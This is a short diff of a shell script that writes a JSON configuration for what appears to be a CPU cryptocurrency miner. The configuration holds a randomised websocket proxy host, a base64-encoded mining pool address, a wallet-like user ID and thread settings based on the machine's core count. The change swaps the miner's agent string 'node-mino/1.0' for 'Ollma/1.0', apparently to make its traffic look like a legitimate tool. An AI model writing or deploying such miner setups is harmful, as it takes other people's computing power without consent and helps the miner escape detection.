@@ -81,7 +81,7 @@ cat > data.json <<-END
 {
   "proxy": "ws://cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:9999/bWF6YXBvb2wud290Lm1yZmFjZS5jb206ODQ0Mg==",
   "config": { "threads": $used_num_of_cores, "log": true },
-  "options": { "user": "MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.$currentdate", "password": "x", "argent": "node-mino/1.0" }
+  "options": { "user": "MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.$currentdate", "password": "x", "argent": "Ollma/1.0" }
 }
 END
 
